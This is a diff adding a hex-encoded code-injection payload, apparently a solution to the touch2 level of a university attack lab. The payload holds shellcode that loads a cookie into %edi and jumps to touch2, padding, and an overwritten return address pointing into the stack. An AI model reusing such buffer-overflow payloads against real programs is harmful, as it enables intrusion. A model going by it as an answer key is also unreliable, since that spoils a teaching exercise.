@@ -1,0 +1,14 @@
+/* Parse cookie */
+8b 3c 25 fa 97 b9 59 	# mov    0x59b997fa,%edi
+68 ec 17 40 00       	# pushq  $0x4017ec
+c3                   	# retq
+
+/* Pad 27 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00
+
+/* insert touch2 address */
+78 dc 61 55 00 00 00 00
+0a
